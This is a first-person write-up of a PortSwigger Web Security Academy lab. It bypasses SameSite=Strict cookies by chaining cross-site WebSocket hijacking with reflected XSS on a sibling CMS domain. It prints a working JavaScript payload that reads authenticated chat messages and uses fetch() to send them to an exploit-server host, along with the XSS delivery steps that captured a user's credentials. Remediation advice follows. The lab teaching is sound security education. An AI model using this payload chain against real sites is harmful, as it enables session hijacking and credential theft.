# Bypassing SameSite Restrictions via a Vulnerable Sibling Domain

**Platform:** PortSwigger Web Security Academy  
**Category:** Web Security  
**Difficulty:** Practitioner  
**Status:** ✅ Solved

## Overview

This lab demonstrates how multiple vulnerabilities can be chained together to bypass `SameSite=Strict` cookie protections and ultimately perform a successful **Cross-Site WebSocket Hijacking (CSWSH)** attack.

### Vulnerabilities Involved

- Cross-Site WebSocket Hijacking (CSWSH)
- Cross-Site Scripting (XSS)
- SameSite Cookie Restrictions (`SameSite=Strict`)
- Vulnerable Sibling Domain

## Objective

The objective of this lab was to access sensitive WebSocket data despite the application's use of `SameSite=Strict` cookies.

## Reconnaissance

While exploring the application, I identified a **Live Chat** feature.

Using **Burp Suite**, I inspected the network traffic and observed a successful **WebSocket handshake**, confirming that the chat functionality relied on WebSockets for real-time communication.
<img width="2616" height="785" alt="l1" src="https://github.com/user-attachments/assets/6ef7a457-1b04-46d5-a95a-c3ee950e1795" />

Further analysis of the WebSocket message history revealed an interesting behavior:
  <img width="3652" height="1037" alt="l2" src="https://github.com/user-attachments/assets/d8b16227-3c38-48fe-b9c7-3dcc57fb1b1b" />

- When the page was refreshed, previous chat messages were automatically reloaded.

- The client sent a `READY` message to the server.
  <img width="2798" height="928" alt="l4" src="https://github.com/user-attachments/assets/4251ba28-2b46-4bb9-abec-5124c6d96b13" />
  <img width="3664" height="939" alt="l5" src="https://github.com/user-attachments/assets/deb261a2-b2f5-4329-bcd4-6a30290165da" />

- The server responded by returning the complete chat history.

This suggested that sensitive information could potentially be exposed if an attacker gained access to an authenticated WebSocket session.

## Identifying the CSWSH Vulnerability

I then evaluated whether the WebSocket endpoint was vulnerable. To confirm this, I created a proof-of-concept payload and delivered it using the exploit server.

### Initial Payload

```html
<script>
var ws = new WebSocket(
  'wss://0afc008d04c291d2802da3b1003300d4.web-security-academy.net/chat'
);

ws.onopen = function() {
    ws.send("READY");
};

ws.onmessage = function(event) {
    fetch(
      'https://exploit-0a5c009d041e9187808ca2ba014a001f.exploit-server.net/log?data=' +
      encodeURIComponent(event.data)
    );
};
</script>
```

Testing confirmed that cross-site WebSocket requests were possible. However, exploitation was unsuccessful because the application used cookies configured with:

```http
SameSite=Strict
```

Since browsers do not send authenticated cookies in a cross-site context when `SameSite=Strict` is enabled, only data associated with a new unauthenticated session could be accessed.

As a result:

✅ CSWSH vulnerability existed.

❌ Sensitive user data remained inaccessible.

## Searching for a SameSite Bypass

Because direct exploitation was blocked, I began looking for an alternative method to execute code within a **same-site context**.

During application exploration, I discovered an additional application hosted on a sibling domain:

```text
cms-0a410058037878ee80ac3f14002100ad.web-security-academy.net
```
<img width="2736" height="1324" alt="l8" src="https://github.com/user-attachments/assets/696ec497-03ee-491b-8f80-f870fa938c90" />

Since sibling domains belong to the same site, a vulnerability on this domain could potentially bypass the `SameSite` restriction.

## Discovering XSS on the Sibling Domain

While testing the CMS application, I discovered that user-controlled input was reflected without proper sanitization.

By injecting JavaScript into a user-supplied parameter, I was able to trigger code execution in the browser, confirming the presence of a **Cross-Site Scripting (XSS)** vulnerability.
<img width="1722" height="684" alt="l9" src="https://github.com/user-attachments/assets/bff5f37f-ab79-4140-bb25-731d4fecb507" />
<img width="3177" height="928" alt="l10" src="https://github.com/user-attachments/assets/21da5e0e-54b6-4e30-9359-090fb21053cd" />


This provided a method for executing arbitrary JavaScript from a trusted same-site origin.

We sent the POST /login request containing the XSS payload to Burp Repeater. In Burp Repeater, we changed the request method from POST to GET.
<img width="2994" height="1168" alt="l11" src="https://github.com/user-attachments/assets/b9e1e4ac-f2d5-412f-8d60-1a6239ba1be9" />

Next, we took the payload that we had previously used and prepared it for use within the XSS attack. The payload was URL-encoded and appended
to the URL of the modified request. Afterward, we tested the request to verify that the payload was being injected correctly.
<img width="2995" height="1197" alt="l13" src="https://github.com/user-attachments/assets/baa7a1e5-0674-44cd-ade7-fa1e96fa5415" />
<img width="3369" height="844" alt="l12" src="https://github.com/user-attachments/assets/b7d06084-cd2c-4ee0-b4a0-8faec21cf0c7" />

We then created another payload:
<script>
    document.location = "cms-0a410058037878ee80ac3f14002100ad.web-security-academy.net";
</script>

We appended the previously URL-encoded payload to the end of this URL and then stored and delivered the exploit.
<img width="3138" height="969" alt="l14" src="https://github.com/user-attachments/assets/be521217-c924-417a-85e4-89312d883283" />

After some time, we accessed the exploit server logs and observed new messages being received.
<img width="3754" height="353" alt="l15" src="https://github.com/user-attachments/assets/6f4b23d3-41d5-49e5-881f-c5d6aafd873f" />

These messages were then analyzed and decoded using Burp Suite's Decoder tool.
<img width="2320" height="957" alt="l16" src="https://github.com/user-attachments/assets/342f9415-0686-4832-8d4b-11c779ae81e0" />

Once the data was decoded, it revealed the target user's credentials.
At this point, the lab objective was successfully completed.
<img width="3207" height="1543" alt="l17" src="https://github.com/user-attachments/assets/d41800ab-f402-437b-9ddf-7ea50a8b7ccd" />

## Result

After successfully leveraging the XSS vulnerability on the sibling domain, authenticated WebSocket messages became accessible.

The captured data contained sensitive information that ultimately led to successful completion of the lab.

This demonstrated how a vulnerability on a trusted sibling domain can completely undermine browser-level security controls.

## Root Cause Analysis

The application relied heavily on `SameSite=Strict` cookies as protection against cross-site attacks.

While this successfully prevented direct CSWSH exploitation, the protection was bypassed because:

- A sibling domain contained an XSS vulnerability.
- The browser trusted requests originating from the same site.
- Additional validation was not implemented on the WebSocket endpoint.

The combination of these weaknesses enabled access to authenticated WebSocket communications.

## Remediation

### Prevent XSS

- Sanitize and validate all user input.
- Apply proper output encoding.
- Implement a strong Content Security Policy (CSP).

### Secure WebSocket Endpoints

- Validate the `Origin` header.
- Implement additional authentication checks.
- Apply CSRF-style protections where appropriate.

### Secure All Subdomains

- Regularly audit sibling domains.
- Maintain consistent security standards across all applications.
- Isolate vulnerable applications where possible.

### Defense in Depth

- Do not rely solely on `SameSite` cookies.
- Combine browser protections with robust server-side validation.

## Key Takeaway

Security controls should never be evaluated in isolation.

Even though `SameSite=Strict` successfully prevented direct CSWSH exploitation, a vulnerable sibling domain provided an alternative path that completely bypassed the protection.

This lab is an excellent example of **vulnerability chaining**, where multiple individually manageable weaknesses combine to create a significant security impact.

## Skills Demonstrated

- WebSocket Security Testing
- Cross-Site WebSocket Hijacking (CSWSH)
- SameSite Cookie Analysis
- Cross-Site Scripting (XSS)
- Subdomain Enumeration
- Vulnerability Chaining
- Burp Suite Analysis
- Web Application Security Assessment

## Lessons Learned

- `SameSite=Strict` is a valuable security control but should not be treated as a complete defense.
- Vulnerabilities on sibling domains can have a direct impact on the security of the primary application.
- WebSocket endpoints should implement origin validation in addition to cookie-based protections.
- Security testing should consider the entire attack surface, not just a single application.

---

**Lab Name:** Bypassing SameSite Restrictions via Vulnerable Sibling Domains  
**Platform:** PortSwigger Web Security Academy  
**Status:** ✅ Successfully Solved
